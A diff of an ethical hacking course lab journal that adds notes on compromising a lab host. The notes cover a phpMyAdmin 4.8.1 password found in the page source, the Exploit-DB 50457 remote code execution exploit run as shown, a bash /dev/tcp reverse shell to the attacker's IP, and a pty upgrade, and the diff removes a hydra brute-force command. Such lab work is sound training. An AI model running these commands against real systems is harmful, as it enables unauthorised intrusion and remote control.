@@ -67,9 +67,50 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-24 11:51:
 ```
 this didn't work. it was just `shallnotpass` (found in source code)
 
+## phpmyadmin
+password: shallnotpass
+
+found in index source code:
+```
+<!DOCTYPE html>
+<html>
+	<body>
+		<h1>Gandalf Bio:</h1>
+
+		<p>Gandalf is a legendary wizard of Middle-earth! His preferred weapons are his wizard staff, glamdring, and narya!</p>
+		
+	        <img src="shallnotpass.gif" alt="shallnotpass">
+
+	</body>
+
+</html>
+```
+
+<img width="876" height="468" alt="image" src="https://github.com/user-attachments/assets/ee1b9a65-f745-47c9-8ebf-2f57f5157cb4" />
+<img width="397" height="231" alt="image" src="https://github.com/user-attachments/assets/4ed36c86-d218-488e-9953-cd4585becc05" />
+
+phpmyadmin version 4.8.1
+
+exploit found here: https://www.exploit-db.com/exploits/50457
+
+```
+┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week10]
+└─$ python3 50457.py 10.0.5.28 80 /phpmyadmin/ gandalf shallnotpass whoami
+/home/champuser/ChamplainTechJournals/eth-hack-sec335/week10/50457.py:29: SyntaxWarning: invalid escape sequence '\s'
+  s = re.search('token"\s*value="(.*?)"', content)
+/home/champuser/ChamplainTechJournals/eth-hack-sec335/week10/50457.py:50: SyntaxWarning: invalid escape sequence '\d'
+  s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
+/home/champuser/ChamplainTechJournals/eth-hack-sec335/week10/50457.py:64: SyntaxWarning: invalid escape sequence '\w'
+  s = re.search('logged_in:(\w+),', content)
+www-data
+```
 
 
-## ssh brute force
+reverse shell on port 4479
 ```
-sudo hydra -l gandalf -P gandalf.mangled.txt 10.0.5.28 -t 4 ssh
+python3 50457.py 10.0.5.28 80 /phpmyadmin/ gandalf shallnotpass "bash -c 'exec bash -i &>/dev/tcp/10.0.17.26/4479 <&1'""
 ```
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
